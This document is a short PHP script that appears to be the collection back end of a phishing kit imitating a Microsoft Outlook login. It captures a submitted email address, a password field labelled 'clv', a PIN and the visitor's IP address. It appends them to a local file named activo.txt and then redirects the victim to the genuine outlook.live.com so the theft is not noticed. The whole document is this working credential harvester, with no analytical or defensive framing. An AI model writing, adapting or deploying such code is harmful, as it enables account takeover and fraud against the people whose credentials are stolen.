<?php
if(isset($_POST['submit'])) {
    $email = $_POST['email'];
    $clv = $_POST['clv'];
    $pin = $_POST['pin'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $data = "Email: $email, clv: $clv, Pin: $pin, IP: $ip  \n";
    $ret = file_put_contents('activo.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        header("Location: https://outlook.live.com//");
        exit;
    }
}
else {
   die('no post data to process');
}
?>